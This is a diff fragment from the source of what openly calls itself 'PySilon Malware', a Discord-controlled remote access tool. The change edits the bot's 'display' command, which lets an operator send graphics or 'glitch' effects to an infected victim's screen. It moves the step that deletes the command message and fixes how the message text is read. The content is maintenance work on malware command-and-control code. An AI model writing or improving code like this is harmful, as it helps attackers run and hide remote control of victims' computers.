@@ -11,16 +11,15 @@ import os
 
 @client.command(name='display')
 async def screen_manipulation(ctx, option=None):
+    await ctx.message.delete()
     if option == 'graphic':
-        await ctx.delete()
         embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
         embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
         await ctx.channel.send(embed=embed)
         expectation = 'graphic_file'
         
     elif option == 'glitch':
-        await ctx.delete()
-        if ctx.content.strip() == '.display-glitch':
+        if ctx.message.content.strip() == '.display-glitch':
             embed = discord.Embed(title="📛 Error",description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
